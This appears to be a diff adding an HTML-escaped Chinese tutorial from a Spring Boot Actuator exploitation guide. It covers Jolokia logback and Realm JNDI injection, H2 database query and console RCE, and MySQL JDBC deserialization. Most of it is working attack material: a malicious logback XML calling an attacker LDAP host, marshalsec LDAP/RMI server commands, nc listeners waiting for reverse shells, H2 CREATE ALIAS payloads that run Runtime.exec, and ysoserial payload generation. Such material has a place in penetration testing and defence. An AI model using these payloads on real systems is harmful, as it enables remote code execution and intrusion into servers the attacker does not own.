+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;insertFromJNDI&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;env-entry-name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ldap://your-vps-ip:1389/JNDIObject&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;as=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;appName&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/configuration&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤三准备要执行的-java-代码&quot;&gt;步骤三：准备要执行的 Java 代码&lt;/h5&gt;
+
+&lt;p&gt;编写优化过后的用来反弹 shell 的 &lt;a href=&quot;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java&quot;&gt;Java 示例代码&lt;/a&gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JNDIObject.java&lt;/code&gt;，&lt;/p&gt;
+
+&lt;p&gt;使用兼容低版本 jdk 的方式编译：&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;javac &lt;span class=&quot;nt&quot;&gt;-source&lt;/span&gt; 1.5 &lt;span class=&quot;nt&quot;&gt;-target&lt;/span&gt; 1.5 JNDIObject.java
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;然后将生成的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JNDIObject.class&lt;/code&gt; 文件拷贝到 &lt;strong&gt;步骤二&lt;/strong&gt; 中的网站根目录。&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤四架设恶意-ldap-服务&quot;&gt;步骤四：架设恶意 ldap 服务&lt;/h5&gt;
+
+&lt;p&gt;下载 &lt;a href=&quot;https://github.com/mbechler/marshalsec&quot;&gt;marshalsec&lt;/a&gt; ，使用下面命令架设对应的 ldap 服务：&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;java &lt;span class=&quot;nt&quot;&gt;-cp&lt;/span&gt; marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤五监听反弹-shell-的端口&quot;&gt;步骤五：监听反弹 shell 的端口&lt;/h5&gt;
+
+&lt;p&gt;一般使用 nc 监听端口，等待反弹 shell&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-lv&lt;/span&gt; 443
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤六从外部-url-地址加载日志配置文件&quot;&gt;步骤六：从外部 URL 地址加载日志配置文件&lt;/h5&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;⚠️ 如果目标成功请求了example.xml 并且 marshalsec 也接收到了目标请求，但是目标没有请求 JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;替换实际的 your-vps-ip 地址访问 URL 触发漏洞：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/your-vps-ip!/example.xml
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;漏洞原理-3&quot;&gt;漏洞原理：&lt;/h4&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;直接访问可触发漏洞的 URL，相当于通过 jolokia 调用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch.qos.logback.classic.jmx.JMXConfigurator&lt;/code&gt; 类的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reloadByURL&lt;/code&gt; 方法&lt;/li&gt;
+  &lt;li&gt;目标机器请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容&lt;/li&gt;
+  &lt;li&gt;目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)&lt;/li&gt;
+  &lt;li&gt;xml 文件中利用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;logback&lt;/code&gt; 依赖的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;insertFormJNDI&lt;/code&gt; 标签，设置了外部 JNDI 服务器地址&lt;/li&gt;
+  &lt;li&gt;目标机器请求恶意  JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h4 id=&quot;漏洞分析-3&quot;&gt;漏洞分析：&lt;/h4&gt;
+
+&lt;p&gt;​	&lt;a href=&quot;https://xz.aliyun.com/t/4258&quot;&gt;spring boot actuator rce via jolokia&lt;/a&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;漏洞环境-3&quot;&gt;漏洞环境：&lt;/h4&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-jolokia-logback-rce&quot;&gt;repository/springboot-jolokia-logback-rce&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;正常访问：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://127.0.0.1:9094/env
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;0x05jolokia-realm-jndi-rce&quot;&gt;0x05：jolokia Realm JNDI RCE&lt;/h3&gt;
+
+&lt;h4 id=&quot;利用条件-8&quot;&gt;利用条件：&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;目标网站存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/jolokia&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator/jolokia&lt;/code&gt; 接口&lt;/li&gt;
+  &lt;li&gt;目标使用了 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jolokia-core&lt;/code&gt; 依赖（版本要求暂未知）并且环境中存在相关 MBean&lt;/li&gt;
+  &lt;li&gt;目标可以请求攻击者的服务器（请求可出外网）&lt;/li&gt;
+  &lt;li&gt;JNDI 注入受目标 JDK 版本影响，jdk &amp;lt; 6u141/7u131/8u121（RMI 方式）&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;利用方法-8&quot;&gt;利用方法：&lt;/h4&gt;
+
+&lt;h5 id=&quot;步骤一查看已存在的-mbeans-1&quot;&gt;步骤一：查看已存在的 MBeans&lt;/h5&gt;
+
+&lt;p&gt;访问 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/jolokia/list&lt;/code&gt; 接口，查看是否存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;type=MBeanFactory&lt;/code&gt; 和 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;createJNDIRealm&lt;/code&gt; 关键词。&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤二准备要执行的-java-代码&quot;&gt;步骤二：准备要执行的 Java 代码&lt;/h5&gt;
+
+&lt;p&gt;编写优化过后的用来反弹 shell 的 &lt;a href=&quot;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java&quot;&gt;Java 示例代码&lt;/a&gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JNDIObject.java&lt;/code&gt;。&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤三托管-class-文件&quot;&gt;步骤三：托管 class 文件&lt;/h5&gt;
+
+&lt;p&gt;在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 使用 python 快速开启 http server&lt;/span&gt;
+
+python2 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; SimpleHTTPServer 80
+python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;将&lt;strong&gt;步骤二&lt;/strong&gt;中编译好的 class 文件拷贝到 HTTP 服务器根目录。&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤四架设恶意-rmi-服务&quot;&gt;步骤四：架设恶意 rmi 服务&lt;/h5&gt;
+
+&lt;p&gt;下载 &lt;a href=&quot;https://github.com/mbechler/marshalsec&quot;&gt;marshalsec&lt;/a&gt; ，使用下面命令架设对应的 rmi 服务：&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;java &lt;span class=&quot;nt&quot;&gt;-cp&lt;/span&gt; marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://your-vps-ip:80/#JNDIObject 1389
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤五监听反弹-shell-的端口-1&quot;&gt;步骤五：监听反弹 shell 的端口&lt;/h5&gt;
+
+&lt;p&gt;一般使用 nc 监听端口，等待反弹 shell&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 443
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤六发送恶意-payload&quot;&gt;步骤六：发送恶意 payload&lt;/h5&gt;
+
+&lt;p&gt;根据实际情况修改 &lt;a href=&quot;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py&quot;&gt;springboot-realm-jndi-rce.py&lt;/a&gt; 脚本中的目标地址，RMI 地址、端口等信息，然后在自己控制的服务器上运行。&lt;/p&gt;
+
+&lt;h4 id=&quot;漏洞原理-4&quot;&gt;漏洞原理：&lt;/h4&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;利用 jolokia 调用 createJNDIRealm 创建 JNDIRealm&lt;/li&gt;
+  &lt;li&gt;设置 connectionURL 地址为 RMI Service URL&lt;/li&gt;
+  &lt;li&gt;设置 contextFactory 为 RegistryContextFactory&lt;/li&gt;
+  &lt;li&gt;停止 Realm&lt;/li&gt;
+  &lt;li&gt;启动 Realm 以触发指定 RMI 地址的  JNDI 注入，造成 RCE 漏洞&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h4 id=&quot;漏洞分析-4&quot;&gt;漏洞分析：&lt;/h4&gt;
+
+&lt;p&gt;​	&lt;a href=&quot;https://static.anquanke.com/download/b/security-geek-2019-q1/article-10.html&quot;&gt;Yet Another Way to Exploit Spring Boot Actuators via Jolokia&lt;/a&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;漏洞环境-4&quot;&gt;漏洞环境：&lt;/h4&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-jolokia-logback-rce&quot;&gt;repository/springboot-jolokia-logback-rce&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;正常访问：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://127.0.0.1:9094/env
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;0x06h2-database-query-rce&quot;&gt;0x06：h2 database query RCE&lt;/h3&gt;
+
+&lt;h4 id=&quot;利用条件-9&quot;&gt;利用条件：&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;可以 POST 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 接口设置属性&lt;/li&gt;
+  &lt;li&gt;可以 POST 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/restart&lt;/code&gt; 接口重启应用（存在 spring-boot-starter-actuator 依赖）&lt;/li&gt;
+  &lt;li&gt;存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.h2database.h2&lt;/code&gt; 依赖（版本要求暂未知）&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;利用方法-9&quot;&gt;利用方法：&lt;/h4&gt;
+
+&lt;h5 id=&quot;步骤一设置-springdatasourcehikariconnection-test-query-属性&quot;&gt;步骤一：设置 spring.datasource.hikari.connection-test-query 属性&lt;/h5&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;⚠️ 下面payload 中的 ‘T5’ 方法每一次执行命令后都需要更换名称 (如 T6) ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;spring 1.x（无回显执行命令）&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /env
+Content-Type: application/x-www-form-urlencoded
+
+spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;spring 2.x（无回显执行命令）&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/env
+Content-Type: application/json
+
+{&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');&quot;}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤二重启应用&quot;&gt;步骤二：重启应用&lt;/h5&gt;
+
+&lt;p&gt;spring 1.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /restart
+Content-Type: application/x-www-form-urlencoded
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;spring 2.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/restart
+Content-Type: application/json
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;漏洞原理-5&quot;&gt;漏洞原理：&lt;/h4&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;spring.datasource.hikari.connection-test-query 属性被设置为一条恶意的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CREATE ALIAS&lt;/code&gt; 创建自定义函数的 SQL 语句&lt;/li&gt;
+  &lt;li&gt;其属性对应 HikariCP 数据库连接池的 connectionTestQuery 配置，定义一个新数据库连接之前被执行的 SQL 语句&lt;/li&gt;
+  &lt;li&gt;restart 重启应用，会建立新的数据库连接&lt;/li&gt;
+  &lt;li&gt;如果 SQL 语句中的自定义函数还没有被执行过，那么自定义函数就会被执行，造成 RCE 漏洞&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h4 id=&quot;漏洞分析-5&quot;&gt;漏洞分析：&lt;/h4&gt;
+
+&lt;p&gt;​	&lt;a href=&quot;https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database&quot;&gt;remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database&lt;/a&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;漏洞环境-5&quot;&gt;漏洞环境：&lt;/h4&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-h2-database-rce&quot;&gt;repository/springboot-h2-database-rce&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;正常访问：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://127.0.0.1:9096/actuator/env
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;0x07h2-database-console-jndi-rce&quot;&gt;0x07：h2 database console JNDI RCE&lt;/h3&gt;
+
+&lt;h4 id=&quot;利用条件-10&quot;&gt;利用条件：&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.h2database.h2&lt;/code&gt; 依赖（版本要求暂未知）&lt;/li&gt;
+  &lt;li&gt;spring 配置中启用 h2 console  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spring.h2.console.enabled=true&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;目标可以请求攻击者的服务器（请求可出外网）&lt;/li&gt;
+  &lt;li&gt;JNDI 注入受目标 JDK 版本影响，jdk &amp;lt; 6u201/7u191/8u182/11.0.1（LDAP 方式）&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;利用方法-10&quot;&gt;利用方法：&lt;/h4&gt;
+
+&lt;h5 id=&quot;步骤一访问路由获得-jsessionid&quot;&gt;步骤一：访问路由获得 jsessionid&lt;/h5&gt;
+
+&lt;p&gt;直接访问目标开启 h2 console 的默认路由 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/h2-console&lt;/code&gt;，目标会跳转到页面 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/h2-console/login.jsp?jsessionid=xxxxxx&lt;/code&gt;，记录下实际的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jsessionid=xxxxxx&lt;/code&gt; 值。&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤二准备要执行的-java-代码-1&quot;&gt;步骤二：准备要执行的 Java 代码&lt;/h5&gt;
+
+&lt;p&gt;编写优化过后的用来反弹 shell 的 &lt;a href=&quot;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java&quot;&gt;Java 示例代码&lt;/a&gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JNDIObject.java&lt;/code&gt;，&lt;/p&gt;
+
+&lt;p&gt;使用兼容低版本 jdk 的方式编译：&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;javac &lt;span class=&quot;nt&quot;&gt;-source&lt;/span&gt; 1.5 &lt;span class=&quot;nt&quot;&gt;-target&lt;/span&gt; 1.5 JNDIObject.java
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;然后将生成的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JNDIObject.class&lt;/code&gt; 文件拷贝到 &lt;strong&gt;步骤二&lt;/strong&gt; 中的网站根目录。&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤三托管-class-文件-1&quot;&gt;步骤三：托管 class 文件&lt;/h5&gt;
+
+&lt;p&gt;在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 使用 python 快速开启 http server&lt;/span&gt;
+
+python2 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; SimpleHTTPServer 80
+python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;将&lt;strong&gt;步骤二&lt;/strong&gt;中编译好的 class 文件拷贝到 HTTP 服务器根目录。&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤四架设恶意-ldap-服务-1&quot;&gt;步骤四：架设恶意 ldap 服务&lt;/h5&gt;
+
+&lt;p&gt;下载 &lt;a href=&quot;https://github.com/mbechler/marshalsec&quot;&gt;marshalsec&lt;/a&gt; ，使用下面命令架设对应的 ldap 服务：&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;java &lt;span class=&quot;nt&quot;&gt;-cp&lt;/span&gt; marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤五监听反弹-shell-的端口-2&quot;&gt;步骤五：监听反弹 shell 的端口&lt;/h5&gt;
+
+&lt;p&gt;一般使用 nc 监听端口，等待反弹 shell&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-lv&lt;/span&gt; 443
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤六发包触发-jndi-注入&quot;&gt;步骤六：发包触发 JNDI 注入&lt;/h5&gt;
+
+&lt;p&gt;根据实际情况，替换下面数据中的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jsessionid=xxxxxx&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.example.com&lt;/code&gt; 和 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ldap://your-vps-ip:1389/JNDIObject&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /h2-console/login.do?jsessionid&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;xxxxxx
+Host: www.example.com
+Content-Type: application/x-www-form-urlencoded
+Referer: http://www.example.com/h2-console/login.jsp?jsessionid&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;xxxxxx
+
+&lt;span class=&quot;nv&quot;&gt;language&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;en&amp;amp;setting&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Generic+H2+%28Embedded%29&amp;amp;name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Generic+H2+%28Embedded%29&amp;amp;driver&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;javax.naming.InitialContext&amp;amp;url&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ldap://your-vps-ip:1389/JNDIObject&amp;amp;user&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;amp;password&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;漏洞分析-6&quot;&gt;漏洞分析：&lt;/h4&gt;
+
+&lt;p&gt;​	&lt;a href=&quot;https://mp.weixin.qq.com/s/Yn5U8WHGJZbTJsxwUU3UiQ&quot;&gt;Spring Boot + H2数据库JNDI注入&lt;/a&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;漏洞环境-6&quot;&gt;漏洞环境：&lt;/h4&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-h2-database-rce&quot;&gt;repository/springboot-h2-database-rce&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;正常访问：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://127.0.0.1:9096/h2-console
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;0x08mysql-jdbc-deserialization-rce&quot;&gt;0x08：mysql jdbc deserialization RCE&lt;/h3&gt;
+
+&lt;h4 id=&quot;利用条件-11&quot;&gt;利用条件：&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;可以 POST 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 接口设置属性&lt;/li&gt;
+  &lt;li&gt;可以 POST 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/refresh&lt;/code&gt; 接口刷新配置（存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spring-boot-starter-actuator&lt;/code&gt; 依赖）&lt;/li&gt;
+  &lt;li&gt;目标环境中存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mysql-connector-java&lt;/code&gt; 依赖&lt;/li&gt;
+  &lt;li&gt;目标可以请求攻击者的服务器（请求可出外网）&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;利用方法-11&quot;&gt;利用方法：&lt;/h4&gt;
+
+&lt;h5 id=&quot;步骤一查看环境依赖&quot;&gt;步骤一：查看环境依赖&lt;/h5&gt;
+
+&lt;p&gt;GET 请求 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator/env&lt;/code&gt;，搜索环境变量（classpath）中是否有 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mysql-connector-java&lt;/code&gt;  关键词，并记录下其版本号（5.x 或 8.x）；&lt;/p&gt;
+
+&lt;p&gt;搜索并观察环境变量中是否存在常见的反序列化 gadget 依赖，比如  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;commons-collections&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Jdk7u21&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Jdk8u20&lt;/code&gt; 等；&lt;/p&gt;
+
+&lt;p&gt;搜索 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spring.datasource.url&lt;/code&gt; 关键词，记录下其 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;value&lt;/code&gt;  值，方便后续恢复其正常 jdbc url 值。&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤二架设恶意-rogue-mysql-server&quot;&gt;步骤二：架设恶意 rogue mysql server&lt;/h5&gt;
+
+&lt;p&gt;在自己控制的服务器上运行 &lt;a href=&quot;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py&quot;&gt;springboot-jdbc-deserialization-rce.py&lt;/a&gt; 脚本，并使用 &lt;a href=&quot;https://github.com/frohoff/ysoserial&quot;&gt;ysoserial&lt;/a&gt; 自定义要执行的命令：&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;java &lt;span class=&quot;nt&quot;&gt;-jar&lt;/span&gt; ysoserial.jar CommonsCollections3 calc &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; payload.ser
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
